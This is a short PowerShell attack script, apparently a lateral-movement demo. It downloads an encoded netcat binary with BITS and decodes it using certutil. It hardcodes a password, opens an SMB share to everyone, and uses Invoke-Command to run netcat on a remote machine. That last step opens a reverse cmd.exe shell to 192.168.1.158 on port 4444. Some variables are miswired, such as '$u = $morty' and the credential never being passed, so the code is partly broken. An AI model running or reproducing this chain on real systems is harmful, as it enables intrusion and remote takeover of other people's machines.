#example
powershell calc.exe

#echo "Securethelogs.com" >> "C:\temp\important_document.txt"
#Start-Process powershell.exe "C:\temp\important_document.txt"

Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe

$m = (Test-WSMan -ComputerName machine-1 -ErrorAction SilentlyContinue)

$u = $morty
$p = "P@ssw0rd"

$secpassword = ConvertTo-SecureString $p -AsPlainText -Force
$mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)

$lc = $env:TEMP + '\nc.exe'

New-SmbShare -Name "RaIny" -Path $env:TEMP -FullAccess "everyone"

$me = $env:COMPUTERNAME

if ($m -ne $null){ Invoke-Command -ComputerName machine-1 -Credential morty -ScriptBlock {\\$me\RaIny\nc.exe 192.168.1.158 4444 -e cmd.exe} }
